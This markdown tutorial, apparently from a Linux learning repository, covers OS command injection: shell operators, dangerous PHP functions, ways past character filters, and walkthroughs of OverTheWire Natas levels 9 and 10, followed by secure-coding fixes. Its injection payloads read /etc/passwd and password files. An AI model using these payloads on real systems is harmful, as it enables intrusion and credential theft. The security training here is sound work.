# 🌐 Web Security — Command Injection

> If the application takes user input and adds it directly to a shell command,
> you can send not one command but two.

---

## 📋 Table of Contents

- [What Is Command Injection?](#what-is-command-injection)
- [Shell Operators](#shell-operators)
- [Dangerous Functions in PHP](#dangerous-functions-in-php)
- [Filter Bypass Techniques](#filter-bypass-techniques)
- [Usage in Natas](#usage-in-natas)

---

## What Is Command Injection?

It arises when the application embeds a value it receives from the user directly inside a shell command.

```php
// Dangerous code:
$word = $_GET['word'];
passthru("grep -r $word /var/log/");
```

If the user types `natas`, the server runs:

```bash
grep -r natas /var/log/
```

Normal. But if the user types `natas; cat /etc/passwd`:

```bash
grep -r natas /var/log/; cat /etc/passwd
#                       ↑
#           a second command was added — it runs!
```

The server runs both commands and prints the contents of `/etc/passwd` to the screen.

---

## Shell Operators

The shell operators used to combine commands are the foundation of command injection.

| Operator | Syntax | When It Runs |
|----------|-----------|------------------|
| `;` | `cmd1; cmd2` | Always (even if cmd1 fails) |
| `&&` | `cmd1 && cmd2` | Only if cmd1 succeeds |
| `\|\|` | `cmd1 \|\| cmd2` | Only if cmd1 fails |
| `\|` | `cmd1 \| cmd2` | Pipes cmd1's output to cmd2 |
| `` `cmd` `` | `` echo `id` `` | Inserts cmd's output |
| `$(cmd)` | `echo $(id)` | Inserts cmd's output (modern) |
| `\n` | `cmd1%0acmd2` | Newline — evades some filters |

### Examples

```bash
# Semicolon — run both commands
natas; id

# Combine the output
natas | cat /etc/natas_webpass/natas10

# Run only the second command
nothing || cat /etc/natas_webpass/natas10

# Command substitution
$(cat /etc/natas_webpass/natas10)
```

---

## Dangerous Functions in PHP

```php
// User input goes directly to the command — all dangerous
system("grep $input /var/log/");
passthru("grep $input /var/log/");
exec("grep $input /var/log/");
shell_exec("grep $input /var/log/");

// Backtick operator — same as exec
$output = `grep $input /var/log/`;
```

### What's the Difference?

| Function | Output | Returns |
|-----------|-------|----------|
| `system()` | Prints to the screen | Last line |
| `passthru()` | Prints to the screen (binary safe) | Nothing |
| `exec()` | Does **not** print to the screen | Last line |
| `shell_exec()` | Does **not** print to the screen | Full output |

In Natas 9 and 10, `passthru` is used — the output comes directly to the screen.

---

## Filter Bypass Techniques

The application may filter some characters. Natas 10 is a good example of this.

### Natas 9 — No Filter

```php
$key = $_REQUEST['needle'];
passthru("grep -i $key dictionary.txt");
```

Any shell operator works:

```
Input:    . /etc/natas_webpass/natas10
Command:  grep -i . /etc/natas_webpass/natas10 dictionary.txt
          → prints the password to the screen
```

The `.` character in grep means "match any character" — it reads the file completely.

### Natas 10 — Filtering Present

```php
$key = $_REQUEST['needle'];

// Filter the ; | & characters
if(preg_match('/[;|&]/', $key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i $key dictionary.txt");
}
```

The `;`, `|`, `&` characters are forbidden. But `. /etc/natas_webpass/natas10` still works because it doesn't use those characters.

```
Input:    . /etc/natas_webpass/natas10
Command:  grep -i . /etc/natas_webpass/natas10 dictionary.txt
```

grep scans both files and matches every line in both files against `.`.

### Common Bypass Methods

**1. Alternative separators**

```bash
# If ; is filtered, try a newline
cmd1%0acmd2          # URL encoded newline
```

**2. Unfiltered operators**

```bash
# If & is filtered, try || (or vice versa)
cmd1 || cmd2
```

**3. Using grep's features**

```bash
# grep -i PATTERN FILE1 FILE2 ... takes multiple files
# Instead of dictionary.txt, give the target file
. /etc/natas_webpass/natas10
#↑ grep pattern: match any character
#  /etc/natas_webpass/natas10: scan this file too
```

**4. Quoting**

In some cases the input is inside quotes:

```php
passthru("grep -i '$key' dictionary.txt");
//                 ↑   ↑
//           inside single quotes
```

To bypass, break out of the quotes:

```
Input:    '; cat /etc/passwd; echo '
Command:  grep -i ''; cat /etc/passwd; echo '' dictionary.txt
```

**5. Space alternatives**

If space is filtered:

```bash
cat${IFS}/etc/passwd      # $IFS = Internal Field Separator (space)
cat</etc/passwd           # with redirection
{cat,/etc/passwd}         # brace expansion
```

---

## Usage in Natas

### Natas 9 — Basic Command Injection

**Source code:**

```php
<?php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

**Exploit:**

To read any password, give it to grep as a file:

```
Input:    . /etc/natas_webpass/natas10
```

This runs the following command:

```bash
grep -i . /etc/natas_webpass/natas10 dictionary.txt
```

Result: every line in `/etc/natas_webpass/natas10` comes to the screen.

**With curl:**

```bash
curl -u natas9:[password] \
     "http://natas9.natas.labs.overthewire.org/?needle=.+/etc/natas_webpass/natas10&submit=Search"
```

---

### Natas 10 — Filtered Command Injection

**Source code:**

```php
<?php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/', $key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

**Analysis:** `;`, `|`, `&` are forbidden — but the same trick still works.

```
Input:    . /etc/natas_webpass/natas11
Command:  grep -i . /etc/natas_webpass/natas11 dictionary.txt
```

We didn't use any of the forbidden characters.

**With curl:**

```bash
curl -u natas10:[password] \
     "http://natas10.natas.labs.overthewire.org/?needle=.+/etc/natas_webpass/natas11&submit=Search"
```

---

### What Should Secure Code Look Like?

```php
// BAD — direct concatenation
passthru("grep $input dictionary.txt");

// GOOD — escape with escapeshellarg
$safe = escapeshellarg($input);
passthru("grep $safe dictionary.txt");

// BETTER — don't use the shell, use a PHP function
$contents = file_get_contents('dictionary.txt');
$lines = explode("\n", $contents);
$results = array_filter($lines, fn($line) => str_contains($line, $input));
```

`escapeshellarg()` → Wraps the input in single quotes and escapes any single quotes inside it.
`escapeshellcmd()` → Escapes shell meta-characters (but is weaker).

---

### Command Injection — Checklist

```
Check in the source code:
  ☐ Are system(), passthru(), exec(), shell_exec() present?
  ☐ Does user input ($GET, $POST, $COOKIE) go to a command?
  ☐ Is escapeshellarg() or escapeshellcmd() used?
  ☐ Which characters are filtered?
  ☐ What can be done with the unfiltered ones?

Try:
  ☐ ; id                      → command separator
  ☐ | id                      → pipe
  ☐ && id                     → and
  ☐ || id                     → or
  ☐ $(id)                     → command substitution
  ☐ . /etc/natas_webpass/...  → grep trick
```

---

## 🔗 Resources

- [PortSwigger — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

---

**Previous topic:** [06_encoding_and_obfuscation.md](./06_encoding_and_obfuscation.md)
**Next topic:** [08_lfi_and_path_traversal.md](./08_lfi_and_path_traversal.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
